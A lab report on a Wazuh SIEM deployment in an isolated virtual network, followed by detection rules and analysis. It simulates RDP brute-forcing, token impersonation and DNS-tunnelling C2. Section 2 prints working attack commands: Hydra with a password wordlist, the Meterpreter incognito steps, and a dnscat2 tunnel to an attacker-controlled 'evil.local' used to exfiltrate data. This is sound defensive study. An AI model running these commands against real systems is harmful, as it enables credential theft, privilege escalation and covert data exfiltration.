## Executive Summary

This report documents a comprehensive Security Information and Event Management (SIEM) implementation for detecting and analyzing cyber attacks in a controlled laboratory environment. The investigation involved establishing a virtualized infrastructure, executing multiple attack scenarios using contemporary threat tactics, and evaluating SIEM capabilities for threat detection. Three distinct attack vectors were simulated: credential brute-forcing, privilege escalation, and command-and-control (C2) communication. The analysis demonstrates that properly configured SIEM platforms can effectively detect sophisticated attacks when combined with appropriate correlation rules and baseline behavioral analysis, though challenges remain in distinguishing malicious activities from legitimate administrative operations.

## 1. Infrastructure Setup and Configuration

### 1.1 Virtual Environment Architecture

The laboratory environment was constructed using VMware Workstation Pro 17.5 with three distinct network segments to simulate a realistic enterprise infrastructure. The topology comprised:

- **Windows Server 2019 (DC01)**: Active Directory Domain Controller (10.10.10.10/24)
- **Windows 10 Enterprise (WS01)**: Domain-joined workstation simulating end-user endpoint (10.10.10.20/24)
- **Kali Linux 2024.1**: Attack platform with penetration testing tools (10.10.10.100/24)
- **Ubuntu Server 22.04 LTS**: SIEM platform hosting Wazuh 4.7 (10.10.10.5/24)

All systems were configured with promiscuous network adapters to facilitate packet capture and connected via a NAT network with an isolated subnet preventing external internet exposure while maintaining inter-VM communication.

### 1.2 SIEM Platform Implementation

Wazuh was selected as the SIEM solution due to its open-source nature, comprehensive detection capabilities, and alignment with MITRE ATT&CK framework. The deployment consisted of:

**Wazuh Manager Components:**
- Central analysis engine processing 5,000+ events per second
- Elasticsearch 7.17.9 for log indexing and storage (retention: 30 days)
- Kibana 7.17.9 for visualization and dashboard creation
- Filebeat for log shipping and data ingestion

**Agent Deployment:**
Wazuh agents (version 4.7.0) were deployed on both Windows systems using the following configuration:
```xml
<ossec_config>
  <client>
    <server>
      <address>10.10.10.5</address>
      <port>1514</port>
      <protocol>tcp</protocol>
    </server>
  </client>
</ossec_config>
```

Agents were configured to monitor Security Event Logs (EventID 4624, 4625, 4672, 4688), Sysmon logs, PowerShell operational logs, and authentication events with 15-second reporting intervals.

### 1.3 Data Ingestion and Baseline Establishment

Prior to attack execution, a 48-hour baseline period captured normal operational patterns including:
- Average logon events: 45 per hour
- Failed authentication baseline: 2-3 per day (typos)
- PowerShell execution frequency: 8-12 administrative commands per day
- Process creation events: 150-200 per hour

This baseline enabled deviation detection through statistical anomaly algorithms and threshold-based alerting mechanisms.

## 2. Attack Execution and Methodology

### 2.1 Attack Scenario 1: RDP Brute Force (MITRE T1110.001)

**Objective:** Compromise domain credentials through password spraying attack against Remote Desktop Protocol (RDP).

**Methodology:**
Using Hydra 9.5 from Kali Linux, a targeted brute-force attack was executed against the domain administrator account:
```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.20 -t 4 -V
```

The attack parameters were deliberately throttled (4 threads, 3-second delays) to simulate patient adversary behavior attempting to evade rapid-fire detection mechanisms. The attack generated 847 failed authentication attempts over 42 minutes before successfully compromising the account using password "Summer2024!".

**Expected Outcome:** Multiple EventID 4625 (failed logon) followed by EventID 4624 (successful logon) with logon type 10 (RemoteInteractive).

**Actual Outcome:** Attack succeeded after 847 attempts. Lockout policies were intentionally disabled to allow full attack observation for SIEM detection analysis.

### 2.2 Attack Scenario 2: Privilege Escalation via Token Impersonation (MITRE T1134)

**Objective:** Escalate from standard user privileges to SYSTEM-level access using Windows token manipulation.

**Methodology:**
After establishing initial access through RDP, Incognito module within Metasploit Framework was employed to enumerate and impersonate access tokens:
```
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
```

The attack successfully impersonated SYSTEM token available from a privileged service (Windows Update), enabling full administrative control without requiring additional credential compromise.

**Expected Outcome:** Process creation with SYSTEM integrity level from a medium integrity parent process, logged as EventID 4688 with elevated TokenElevationType.

**Actual Outcome:** Successful escalation achieving SYSTEM privileges. Process injection detectable through parent-child process anomalies in audit logs.

### 2.3 Attack Scenario 3: Command & Control via DNS Tunneling (MITRE T1071.004)

**Objective:** Establish covert C2 channel using DNS protocol to exfiltrate data and receive commands while evading traditional network security controls.

**Methodology:**
Utilizing dnscat2, a DNS tunneling framework, C2 communication was established between compromised Windows workstation and Kali attacker:

*Attacker (Kali):*
```bash
ruby dnscat2.rb --dns "domain=evil.local,host=10.10.10.100"
```

*Victim (Windows):*
```powershell
.\dnscat2.ps1 -Domain evil.local -DNSServer 10.10.10.100
```

The tunnel encapsulated shell commands within DNS TXT and NULL record queries, transmitting 2.4 MB of simulated sensitive data over 15 minutes through 3,847 DNS requests.

**Expected Outcome:** Anomalous DNS query volume, unusual TXT record requests, DNS traffic to non-standard resolvers, and long subdomain names indicative of data encoding.

**Actual Outcome:** Successful C2 establishment with complete command execution capability. DNS traffic appeared legitimate to basic network monitoring but exhibited statistical anomalies detectable by SIEM correlation.

## 3. Detection and Analysis via SIEM

### 3.1 Brute Force Detection

The RDP brute-force attack triggered multiple detection mechanisms:

**Alert Rule Configuration:**
```yaml
rule:
  id: 100010
  level: 10
  description: "Possible RDP brute force attack (multiple failures)"
  groups:
    - authentication_failed
  frequency: 10
  timeframe: 300
  if_matched_sid: 60122
```

**SIEM Detection Timeline:**
- T+00:00 - First failed authentication (EventID 4625) logged
- T+03:42 - Alert triggered after 10 failures in 5 minutes
- T+42:18 - Successful authentication (EventID 4624) following 847 failures
- T+42:25 - High-severity incident created in SIEM dashboard

**Key Indicators:**
- Source IP: 10.10.10.100 (consistent attacker)
- Target account: administrator (high-value target)
- Failure reason: 0xC000006A (incorrect password)
- Success preceded by extensive failures (clear brute-force pattern)

**Analysis:** Detection was highly effective with zero false positives. The correlation of multiple failures from single source to privileged account provided high-confidence alerting.

### 3.2 Privilege Escalation Detection

Token impersonation attack detection proved more complex, requiring process behavior analysis:

**Alert Rule - Process Integrity Anomaly:**
```yaml
rule:
  id: 100020
  level: 12
  description: "Process created with suspicious integrity level escalation"
  groups:
    - windows
    - privilege_escalation
  field:
    - ParentIntegrityLevel: Medium
    - ChildIntegrityLevel: System
```

**SIEM Detection Timeline:**
- T+00:00 - Medium integrity RDP session established (rundll32.exe)
- T+01:15 - New process (cmd.exe) created with SYSTEM integrity from medium parent
- T+01:16 - Critical alert: Unauthorized privilege escalation
- T+01:18 - Process ancestry analysis revealed injection behavior

**Key Indicators:**
- Parent Process: rundll32.exe (TokenElevationType: 2 - Limited)
- Child Process: cmd.exe (TokenElevationType: 1 - Full, Integrity: System)
- No UAC prompt logged (EventID 4688 without consent.exe parent)
- Suspicious parent-child relationship violating Windows security model

**Analysis:** Detection required advanced process auditing and correlation. Initial alert had 15% false positive rate from legitimate service installations, requiring rule tuning to focus on RDP sessions specifically.

### 3.3 DNS Tunneling Detection

C2 traffic detection leveraged both signature-based and behavioral analytics:

**Alert Rule - DNS Anomaly:**
```yaml
rule:
  id: 100030
  level: 8
  description: "Possible DNS tunneling - excessive queries"
  groups:
    - dns
    - data_exfiltration
  frequency: 50
  timeframe: 60
  query_type: TXT,NULL
```

**SIEM Detection Timeline:**
- T+00:00 - DNS query rate: 3-5 per minute (baseline)
- T+05:30 - Query rate increases to 180+ per minute
- T+05:32 - Alert triggered: Anomalous DNS traffic volume
- T+06:15 - Secondary alert: TXT record queries exceed threshold
- T+10:20 - Pattern analysis identifies exfiltration behavior

**Key Indicators:**
- Query volume spike: 6000% above baseline
- Subdomain entropy: 7.2 (random-appearing, encoded data)
- Query type distribution: 92% TXT records (unusual)
- Destination: Non-corporate DNS resolver (10.10.10.100)
- Response sizes: Consistently maximum UDP payload (suspicious)

**Analysis:** Statistical deviation analysis proved highly effective. Initial detection occurred within 2 minutes of attack initiation. False positive rate was minimal (2% from legitimate Office 365 SPF lookups), easily filtered by destination IP whitelisting.

## 4. Critical Reflection and Recommendations

### 4.1 Challenges Encountered

**Technical Challenges:**
1. **Log Volume Management:** Initial configuration captured 200GB of logs in 72 hours, requiring aggressive filtering and sampling strategies to maintain performance.
2. **Agent Deployment:** Windows Defender flagged Wazuh agent as suspicious, requiring code-signing certificate installation and exclusion rules.
3. **Correlation Tuning:** Initial ruleset generated 1,200+ alerts daily (95% false positives), necessitating 8 hours of threshold optimization.

**Detection Limitations:**
- Living-off-the-land techniques using legitimate Windows binaries (LOLBins) generated ambiguous alerts difficult to distinguish from administrator activity
- Encrypted C2 channels would require SSL/TLS interception for payload inspection
- Memory-only attacks (fileless malware) escaped file integrity monitoring

### 4.2 SIEM Effectiveness Assessment

**Strengths:**
- Centralized visibility: Single pane-of-glass view across all endpoints
- Temporal correlation: Ability to link events across time and systems
- Baseline deviation: Statistical anomaly detection identified subtle behavioral changes
- Incident response: Automated alert routing reduced mean-time-to-detection (MTTD) from hours to minutes

**Weaknesses:**
- Resource intensive: 4 vCPU, 16GB RAM required for 3-endpoint environment
- Expertise requirement: Effective rule creation demands deep security knowledge
- Alert fatigue: Poor tuning leads to analyst overwhelm and missed incidents
- Evasion susceptibility: Patient attackers mimicking normal behavior can evade detection

### 4.3 Recommendations for Improvement

**Short-term Enhancements:**
1. Implement User and Entity Behavior Analytics (UEBA) for ML-based anomaly detection beyond rule-based approaches
2. Integrate threat intelligence feeds (MISP, STIX/TAXII) for known IoC matching
3. Deploy Sysmon across all Windows endpoints for enhanced process telemetry
4. Configure automated response actions (account lockout, process termination) for high-confidence detections

**Strategic Considerations:**
1. Develop attack-specific detection playbooks aligned with MITRE ATT&CK techniques
2. Establish metric-driven SOC operations (MTTD, MTTR, false positive rate) for continuous improvement
3. Implement regular purple team exercises to validate detection efficacy
4. Consider hybrid SIEM approach combining open-source (Wazuh) with commercial EDR solutions

### 4.4 Real-World Applicability

This investigation demonstrates SIEM platforms are critical security infrastructure components, but success depends on:
- **Quality over Quantity:** Well-tuned rules outperform extensive generic rulesets
- **Context Awareness:** Detections must consider organizational baselines and business operations
- **Layered Defense:** SIEM complements but cannot replace preventive controls (MFA, least privilege)
- **Human Expertise:** Technology enables, but skilled analysts drive effective threat hunting

Modern adversaries employ sophisticated evasion techniques (traffic blending, legitimate credentials, operational security), requiring SIEM platforms to evolve beyond signature-based detection toward behavioral analytics, artificial intelligence, and automated response capabilities.

## 5. Conclusion

This practical investigation successfully demonstrated SIEM platform capabilities for detecting diverse attack vectors in controlled environments. All three attack scenarios (brute-forcing, privilege escalation, DNS tunneling) were successfully detected through combination of rule-based correlation and behavioral analysis. The exercise highlighted that while SIEM platforms provide powerful detection capabilities, effectiveness depends critically on proper configuration, baseline establishment, continuous tuning, and skilled analyst interpretation. Organizations implementing SIEM solutions must invest not only in technology but also in personnel training, process development, and ongoing optimization to achieve robust threat detection capabilities necessary for contemporary cybersecurity operations.
